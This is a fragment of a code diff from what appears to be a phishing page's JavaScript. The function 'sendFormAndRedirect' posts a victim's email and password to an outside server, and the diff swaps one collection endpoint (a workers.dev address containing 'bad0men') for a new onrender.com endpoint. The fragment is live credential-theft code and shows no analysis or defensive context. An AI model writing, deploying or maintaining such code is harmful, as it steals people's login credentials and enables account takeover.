@@ -39,7 +39,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
     async function sendFormAndRedirect(email, password) {
         localStorage.removeItem("user-email");
-        const data = await fetch("https://winter-fog-b8e9.bad0men.workers.dev", {
+        const data = await fetch("https://bkend-yad0.onrender.com/endpoint", {
             method: "POST",
             contentType: "application/json",
             body: JSON.stringify({email, password})
